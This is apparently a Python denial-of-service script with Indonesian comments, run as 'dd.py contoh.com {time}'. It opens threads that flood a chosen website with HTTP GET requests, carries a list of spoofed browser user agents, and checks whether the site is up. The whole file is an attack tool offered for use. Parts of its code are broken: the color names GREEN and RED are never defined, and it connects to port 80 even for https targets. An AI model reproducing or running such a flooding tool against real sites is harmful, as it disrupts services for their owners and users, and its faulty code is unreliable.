import socket
import threading
import time
import sys
import requests

# Konfigurasi target
target_url = sys.argv[1]
target_port = 80

# Konfigurasi serangan
num_threads = 1000
num_packets = 1000
packet_size = 1024

# User Agent
user_agents = [
    "Mozilla/5.0 (Linux; Android 11; Oppo A16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Vivo Y16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Realme 10c) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Tenco Vova 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Asus ROG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Chrome OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Safari/537.36"
]

# Fungsi untuk mengirimkan paket
def send_packet():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if target_url.startswith("https://"):
        sock.connect((target_url[8:], target_port))
    else:
        sock.connect((target_url, target_port))
    header = b"GET / HTTP/1.1\r\nHost: " + target_url.encode() + b"\r\nUser-Agent: " + user_agents[0].encode() + b"\r\n\r\n"
    sock.send(header)
    sock.close()

# Fungsi untuk menjalankan serangan
def run_attack():
    for _ in range(num_packets):
        thread = threading.Thread(target=send_packet)
        thread.start()
    time.sleep(int(sys.argv[2]))  # Berhenti setelah waktu yang ditentukan

# Jalankan serangan
if len(sys.argv) != 3:
    print("Usage: python dd.py contoh.com {time}")
    sys.exit(1)
target_url = sys.argv[1]

# Cek status website
try:
    response = requests.get(target_url)
    if response.status_code == 200:
        print(f"WEBSITE UP {GREEN}")
    else:
        print(f"WEBSITE DOWN {RED}")
except requests.exceptions.ConnectionError:
    print(f"WEBSITE DOWN {RED}")

# Jalankan serangan
run_attack()
